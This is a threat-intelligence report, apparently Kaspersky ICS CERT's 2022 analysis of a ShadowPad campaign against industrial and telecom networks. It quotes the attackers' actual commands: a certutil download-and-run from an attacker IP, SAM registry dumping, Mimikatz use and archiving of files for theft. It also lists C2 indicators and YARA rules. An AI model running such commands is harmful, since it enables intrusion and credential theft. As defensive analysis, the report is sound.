Attacks on industrial control systems using ShadowPadArtem SnegirevKirill Kruglov27.06.2022Version 1.1Executive summary 2Initial infection 3ShadowPad 3Post-exploitation 4Additional tools 6CobaltStrike 6PlugX backdoor – aro.dat 6Bat file for credential theft 7Webshell 7Infrastructure 8Victims 8Attribution 8Conclusion 9Appendix I – Indicators of Compromise 10Appendix II – MITRE ATT&CK Mapping 13ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD1 © 2022 AO KASPERSKY LABExecutive summaryIn mid-October 2021 Kaspersky ICS CERT researchers uncovered an active ShadowPad backdoor infection on industrial control systems (ICS) in Pakistan. Infected machines included engineering computers in building automation systems that are part of the infrastructure of a telecommunications company.During the investigation researchers uncovered larger-scale activity by the threat actor in the network of the telecommunications company and also identified other victims of the campaign. We found malicious artifacts in organizations in the industrial and telecommunications sectors in both Pakistan and Afghanistan. Moreover, another attack was uncovered, using an earlier, but with very similar set of tactics, techniques and procedures (TTPs), against a logistics and transport organization (a port) in Malaysia.Apparently, the wave of attacks uncovered by the experts began in March 2021.Some of the victim organizations were breached by exploiting the CVE-2021- 26855 vulnerability in Microsoft Exchange.During the investigation we found additional tools and commands used by the threat actor after the initial infection.• From March to October 2021, the ShadowPad backdoor was downloaded tovictim computers as the mscoree.dll file, which was launched by AppLaunch.exe – a perfectly legitimate application.• Later the attackers launched ShadowPad using DLL hijacking in a legitimateOLE-COM object viewing application (OleView).• After the initial infection the attackers first sent commands manually, thenautomatically.• Other tools were also used:o The CobaltStrike framework, which was downloaded to victimmachines using the certutil.exe utility, compiled aspx web shells, and procdump and Mimikatz tools;o The PlugX backdoor;o BAT files (for stealing credentials);o Web shells (for remote access to the web server);o The Nextnet utility (for scanning network hosts).The attackers used domains registered with NameSilo, GoDaddy.com and ENOM to communicate with the command-and-control (C2) servers. Most of the C2 servers were hosted on dedicated servers rented from Choopa.ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD2 © 2022 AO KASPERSKY LABThe newly identified attacks on a variety of organizations had an almost totally unique set of TTPs, which leads us to believe that the same Chinese-speaking threat actor was behind all of these attacks.At the time of writing, we do not know the ultimate goal of the attacker. We think it was probably data harvesting.We believe that it is highly likely that this threat actor will strike again and we will find new victims in different countries.The full report is available on the Kaspersky Threat Intelligence portal. For more information please contact ics-cert@kaspersky.com.Initial infectionIn mid-October 2021, Kaspersky ICS CERT experts discovered an active ShadowPad backdoor that affected a number of industrial control systems in Pakistan, specifically engineering computers in building automation systems that are part of a telecom company’s infrastructure. A further analysis of the attack revealed other organizations affected by it – manufacturing and telecommunications companies in Pakistan, a telecomnunications company in Afghanistan, and a logistics and transport organization (a port) in Malaysia. Apparently, the wave of attacks uncovered by the experts began in March 2021.The attackers exploited a known vulnerability in MS Exchange, CVE-2021-26855, as the initial attack vector in several victim organizations. We do not have evidence that CVE-2021-26855 was exploited in all cases of attack identified, but we can assume that the attackers could use this particular vector to penetrate in other cases, as well.ShadowPadIn the course of our investigation, we determined that in the beginning of March 2021, the ShadowPad backdoor was downloaded on the attacked computers under the guise of the mscoree.dll file, which was launched by the legitimate application AppLaunch.exe located in the same folder with ShadowPad. AppLaunch.exe was executed by creating a task in the Windows Task Scheduler.ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD3 © 2022 AO KASPERSKY LABExport table of the mscoree.dll (ShadowPad) maliciouis DLLIn some of the cases we studied at the same time, we found that a ShadowPad sample that had the same name and launching scheme was executed by exploiting the MS Exchange CVE-2021-26855 vulnerability.Since about mid-October 2021, a new ShadowPad launching scheme and a new version of the malware has been used targeting the same organizations. Instead of using mscoree.dll, the attackers switched to using the dll hijacking technique in legitimate software for viewing OLE-COM objects (OleView). The legitimate OleView application downloads the malicious IVIEWERS.dll library, which in turn downloads and executes the ShadowPad payload contained in IVIEWERS.dll.dat.The Windows Task Scheduler was also used for the new ShadowPad version to get a foothold in a system. In total, we managed to find 25 unique modifications.A more detailed analysis of some modifications of the new ShadowPad version is presented in a recent report published by PwC.Post-exploitationWe found that on a subset of computers (at least one in each attacked organization’s network), some series of commands had been remotely executed via the command line interface (cmd.exe).At first, the attackers entered the commands manually (this is indicated by both the time intervals between commands and the resulting output not being redirected to anything other than standard output).The list of commands executed by the attackers manually is shown in the original sequence in the table below.ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD4 © 2022 AO KASPERSKY LABCommandDescriptioncmd.exe /C arp -a > $temp\gGjrIFGa.tmp 2>&1quser.exenetstat -ano netstat userxcopy.exe /s $user\desktop c:\$recycle.bin\temp\ \ping.exe 8,8,8,8 ping.exe google.com to a file in the $temp directorycollect information about users authorized in the systemcollect information about active users and network connectionscopy all files from the desktop to the recycle.bin folder (it is worth noting that the organization's domain name is also present in the path)check the availability of internet services, probably accountcmd.exe m1.loglaunch Trojan-PSW.Win32.Mimikatzreg.exe save hklm\sam sam.hivesave registry key containing NTLM hashes to diskcmd.exe /C $programfiles\winrar\rar.exe a -r -hp1234 C:$recycle.bin\10020111desk.rar $user\desktop\*.txt $user\desktop\*.xls* $user\desktop\*.pdf $user\desktop\*.doc* $user\desktop\*.jpg > $temp\lwefqERM.tmp 2>&1winrar.exe a -r -ep1 -p3210 -m5 -s -iback nat temparchive the files collected that potentially contain confidential informationarchive the files collected using the console version of WinRar$windir\appcompat\programs\xerice.exe open-source tool written in Go)Later, the attackers began to distribute a malicious script for cmd.exe over the networks of attacked organizations. The script was almost completely identical (in terms of its contents and the sequence of commands) to the manual activity sequence detected earlier, but it contained an operator to redirect the output of execution results to a file.The script for cmd.exe that was discovered was not only delivered over the network, but was also added by the attackers to the task scheduler for daily execution.ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD5 © 2022 AO KASPERSKY LABExample of a the process of computersIt is important to note that this part of the TTPs is quite unique and we believe it supports attributing all cases of similar activity to one Chinese-speaking group of attackers.The artifacts found indicate that the attackers stole domain authentication credentials from at least one account in each attacked organization (probably from the same computer that was used to penetrate the network). These credentials were used to further spread the attack over the network, first manually and then in automatic mode.Additional toolsCobaltStrikeThe attackers used CobaltStrike, which was downloaded to the victim's computer using the certutil.exe utility, compiled aspx webshells, the procdump tool, and Mimikatz.CobaltStrike was downloaded using the following command:"$system32\cmd.exe" /c certutil.exe -urlcache -split -f hxxp://116.206.92[.]26:82/update.exe && update.exe && certutil.exe -urlcache -split - f hxxp://116.206.92[.]26:82/update.exe deletePlugX backdoor – aro.datIn addition to the ShadowPad backdoor, activity associated with downloading aro.dat, a variant of the PlugX backdoor, using bitsadmin was identified on the server of one of the victims.Downloading aro.dat backdoorATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD6 © 2022 AO KASPERSKY LABA description of the PlugX backdoor is provided in an article published by Palo Alto Networks.Bat file for credential theftA bat file was found on a mail server of one of the victims, which the attackers used to collect information and steal the NTLM hashes of accounts.Bat file found on a victim’s webshellThe contents of this file are very similar to the bat file described in a VB article, which mentions that the script was used by the Chinese group HAFNIUM.Malicious dll files were found on the victim’s mail servers. These are compiled .NET Assembly files for aspx scripts used by the actor for remote access to the web server (webshell).ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD7 © 2022 AO KASPERSKY LABThe sequence of commands sent by default to the victim's webshell was tracked earlier in the well-known China Chopper Webshell:"cmd" /c cd /d "C:/inetpub/wwwroot/aspnet_client"&whoami&echo [S]&cd&echo [E]"InfrastructureThe ShadowPad CnC servers found are mostly hosted on rented dedicated Choopa servers.DomainIPFirst seenorder.cargobussiness[.]site45.77.249[.]48March 24, 2021documents.kankuedu[.]org45.76.54[.]156March 23, 2021live.musicweb[.]xyz192.248.151[.]110March 17, 2021obo.videocenter[.]org-tech.obj[.]services108.160.133[.]247103.152.255[.]82houwags.defineyourid[.]site107.191.47[.]52198.13.44[.]4895.179.142[.]104noub.crabdance[.]com45.77.243[.]20445.32.101[.]19695.179.142[.]104192.248.180[.]109grandfoodtony[.]com-May 21, 2021October 21, 2021October 18, 2021October 28, 2021October 13, 2021October 29, 2021October 02, 2021October 19, 2021October 28, 2021October 28, 2021ASN204732047320473VictimsWe identified malicious artifacts in organizations located in Pakistan and Afghanistan and operating in manufacturing & telecom sectors. The attack using older TTPs and exploiting the Microsoft Exchange vulnerability also targeted a logistics and transportation organization (a port) in Malaysia.AttributionWe believe with a high degree of confidence that a Chinese-speaking threat actor is behind the activity described in this report.ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD8 © 2022 AO KASPERSKY LABThere are some minor references to HAFNUIM, a Chinese-speaking threat actor, but they are not sufficient to speak of HAFNUM’s involvement in attacks 9382), which was identified during our investigation on computers of organizations in Pakistan, Malaysia, and Afghanistan, was also mentioned in a Symantec report. The report also claims that the threat actor HAFNIUM was involved in attacks exploiting a Microsoft Exchange Server vulnerability. In addition, a bat file for stealing NTLM hashes of accounts was found on a server of one of the victims. The contents of the bat file found are very similar to the bat file described in the VB article, which mentions that this script was used by HAFNIUM.•Activity related to downloading the PlugX backdoor (aro.dat), which occurred on the server of one of the victims, was analyzed in the Palo Alto Networks report, which alleges the involvement of a Chinese group known as PKPLUG.ConclusionAs mentioned above, building automation systems were among the systems attacked in the campaign described in this report. We often see accidental infections on such systems, but they are rare targets for APT actors. Although the final goals of the attack remain unknown, the attackers are most likely interested in gathering information. We strongly believe that those systems themselves could be a valuable source of highly confidential information. Additionally, we believe there is a chance that they also provide attackers with a backdoor to other, more strictly secured, infrastructure.The attackers’ TTPs enabled us to link these attacks to a Chinese-speaking threat actor, and we observed victims located in different regions. This means that the actor we have identified may have broader geographical interests and we could expect more victims to be discovered in different countries in the future.ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD9 © 2022 AO KASPERSKY LABAppendix I – Indicators of CompromiseShadowPad (mscoree.dll)91131CCF507F61279268FA857AB534638D5807D8EE69E472764FAEE7269B460B1A5856C343597DC219E3F5456018612B27F636A36207581E75C700C0E36A8031ShadowPad (iviewers.dll)011BEAF3E9CD2896479313772CD591DEA7F3BF89F0B41704F185545C784B845735912C914BD84F23203C8FADAC6D0548299980C914250BAC7522DE849F6DF24F381616642D2567F8872B150B37E5196B31FDAE0B71C290440E0B465B17CF3C8D420FCF11240589E8D29DAAB08251831D40CD646554ED42D385CA6B55B9D3397D61BA23B3B3D132FE0825907C0EA583990CAC537476FD71763C07EDFD7D831F0F80EE7A1E9AD4AC6AFCAC83087DC5360FBat file for credential theft:74E43ECA18E8C92CB332BBB671CE13B8Trojan-PSW.Win32.Mimikatz.eni (m1.log)C024E5163AB6DD844813BF0D9A6F082BNextnet (xerice.exe)86B25E416EEE0F5FB17370F3929E45F48EE863C926D6847D1BF767783E700248Domains and IPs (ShadowPad C&C)url ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD10 © 2022 AO KASPERSKY LABurl hosting and C&Cstorage.ondriev[.]tk 116.206.92[.]26api.onedriev[.]tk 69.172.80[.]131ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD11 © 2022 AO KASPERSKY LABYara rulesimport "pe" description = "Rule for detecting Shadowpad iviewers.dll variant" version = "1.0" last_modified = "2022-02-11" $viewers = "VIEWER.dll" fullword $Iviewers = "IVIEWERS.dll" $oleview = "OLEViewer" $comapi = "viewer Copyright" wide condition: uint16(0) == 0x5A4D and filesize < 2MB and pe.DLL and ($Iviewers or $comapi or not for any i in (0 pe.number_of_signatures) : (pe.signatures[0].subject contains "O=Microsoft Corporation") and not $oleview description = "Rule for detecting backdoor webshell" version = "1.0" last_modified = "2022-02-11" $exec = {65 00 78 00 65 00 63 00 5F 00 63 00 6F 00 64 00 65} uint16(0) == 0x5A4D and filesize < 1MB and $exec and $JScriptEvaluate and $JScriptImport and $JScriptPackage and $CreateEngineWithType }ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD12 © 2022 AO KASPERSKY LABAppendix II – MITRE ATT&CK MappingThis table contains all the TTPs identified in the analysis of the activity described in this report.TacticTechniqueTechnique NameExecutionT1059.001Command and Scripting Interpreter: PowerShellThe attacker uses a PowerShell script to download and execute additional payloads.T1053.005Scheduled TaskThe attacker creates scheduled tasks for daily execution of malicious payloads.T1047Windows Management InstrumentationThe attacker creates a WMI event to execute an information gathering tool on startup.PersistenceT1197BITS JobsThe attacker uses a BITS job to download additional payloads.T1574.002Hijack Execution Flow: DLL Side-LoadingThe attacker leverages a legitimate binary to load ShadowPad.T1053.005Scheduled TaskThe attacker creates scheduled tasks to set up daily execution of malicious payloads.Defense EvasionT1197BITS JobsThe attacker uses a BITS job to download additional payloads.T1140Deobfuscate/Decode Files or InformationDownloaded tools are encoded with base64T1222.001File and Directory Permissions ModificationThe attacker uses attrib to change the permissions of the malicious files and the working directory to hide them.T1564.001Hide ArtifactsThe attacker uses attrib to change the permissions of the malicious files and the working directory to hide them.T1574.002Hijack Execution Flow: DLL Side-LoadingThe attacker leverages a legitimate binary to load ShadowPad.DiscoveryT1083File and Directory DiscoveryThe attacker lists files and directories available on infected systems.T1046Network Service ScanningThe attacker uses a pentesting tool to list the NETBIOS services.ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD13 © 2022 AO KASPERSKY LABT1012Query RegistryThe attacker queries the registry to get a history of connected USB devices.CollectionT1560.002Archive Collected Data: Archive via UtilityCommand and ControlThe attacker uses the rar tool to create a password-protected archive.T1560.002Archive Collected Data: Archive via LibraryThe attacker compresses the data with a password using the Zip library.T1119Automated CollectionThe attacker automatically collects a list of files and connected USB devices.T1005Data from Local SystemThe attacker uses a PowerShell script to collect Office documents on the local system.T1114.001Email Collection: Local Email CollectionThe attacker specifically exfiltrates .pst archives.T1071.001Application Layer Protocol: Web ProtocolsThe attacker uses web protocols to download additional tools, exfiltrate data and operate the malware.T1132.001Data Encoding: Standard EncodingThe data is encoded using compression with a password.T1090.001Proxy: Internal ProxyThe attacker uses netcat and Stowaway-Node to create tunnels inside the victim network.T1090.002Proxy: External ProxyThe attacker uses netcat and Stowaway-Node to create tunnels to the outside of the network.ExfiltrationT1020Automated ExfiltrationThe attacker can automatically exfiltrate Office documents.T1041Exfiltration Over C2 ChannelThe attacker exfiltrates data over the C2 channel.T1567.002Exfiltration Over Web Service: Exfiltration to Cloud StorageThe attacker exfiltrates data to Google Drive.ATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD14 © 2022 AO KASPERSKY LABKaspersky Industrial Control Systems Cyber Emergency Response Team (Kaspersky ICS CERT) is a global project of Kaspersky aimed at coordinating the efforts of automation system vendors, industrial facility owners and operators, and IT security researchers to protect industrial enterprises from cyberattacks. Kaspersky ICS CERT devotes its efforts primarily to identifying potential and existing threats that target industrial automation systems and the industrial internet of things.Kaspersky ICS CERTics-cert@kaspersky.comATTACKS ON INDUSTRIAL CONTROL SYSTEMS USING SHADOWPAD15 © 2022 AO KASPERSKY LAB 